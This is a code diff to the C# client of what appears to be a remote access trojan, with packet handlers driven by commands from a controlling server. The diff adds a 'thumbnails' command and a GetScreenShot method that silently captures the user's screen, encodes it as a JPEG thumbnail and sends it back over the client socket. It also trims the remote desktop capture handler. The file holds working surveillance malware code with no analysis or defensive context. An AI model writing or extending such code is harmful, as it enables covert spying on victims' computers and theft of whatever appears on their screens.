@@ -4,6 +4,8 @@ using Client.Sockets;
 using Microsoft.Win32;
 using System;
 using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Net.Sockets;
 using System.Threading;
@@ -30,6 +32,13 @@ namespace Client.Handle_Packet
                     case "Ping":
                         {
                             Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
+                        }
+                        break;
+
+
+                    case "thumbnails":
+                        {
+                            GetScreenShot();
                         }
                         break;
 
@@ -108,18 +117,8 @@ namespace Client.Handle_Packet
                         {
                             switch (unpack_msgpack.ForcePathObject("Option").AsString)
                             {
-                                case "false":
-                                    {
-                                        //if (RemoteDesktop.RemoteDesktopStatus == false) return;
-                                        // RemoteDesktop.RemoteDesktopStatus = false;
-                                    }
-                                    break;
-
                                 case "true":
                                     {
-                                        // if (RemoteDesktop.RemoteDesktopStatus == true) return;
-                                        // RemoteDesktop.RemoteDesktopStatus = true;
-                                        // RemoteDesktop.CaptureAndSend();
                                         RemoteDesktop remoteDesktop = new RemoteDesktop();
                                         remoteDesktop.CaptureAndSend();
                                     }
@@ -236,7 +235,6 @@ namespace Client.Handle_Packet
                             }
                         }
                         break;
-
                 }
             }
             catch { }
@@ -280,6 +278,22 @@ namespace Client.Handle_Packet
             }
         }
 
+        private static void GetScreenShot()
+        {
+            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            using (Graphics g = Graphics.FromImage(bmp))
+            using (MemoryStream memoryStream = new MemoryStream())
+            {
+                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
+                Image thumb = bmp.GetThumbnailImage(256, 256, () => false, IntPtr.Zero);
+                thumb.Save(memoryStream, ImageFormat.Jpeg);
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "thumbnails";
+                msgpack.ForcePathObject("Image").SetAsBytes(memoryStream.ToArray());
+                ClientSocket.BeginSend(msgpack.Encode2Bytes());
+            }
+            bmp.Dispose();
+        }
 
     }
 }
